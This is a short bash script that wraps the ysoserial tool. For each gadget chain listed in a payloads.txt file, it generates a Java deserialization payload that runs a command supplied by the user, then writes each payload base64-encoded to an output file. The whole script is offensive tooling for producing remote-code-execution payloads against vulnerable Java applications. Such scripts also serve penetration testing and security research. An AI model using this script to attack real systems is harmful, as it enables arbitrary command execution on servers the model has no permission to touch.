#!/bin/bash
# --Generate all payloads--
command="$@"
if [ -z "$command" ]; then
    echo "./generate_payloads.sh <commands>"
    exit
fi
payload_file="$(pwd)/payloads.txt"
while read -r payload; do
  echo "$(java11 -jar ysoserial-all.jar $payload "$command" | base64 -w 0)" >> serialized_payloads
done <$payload_file
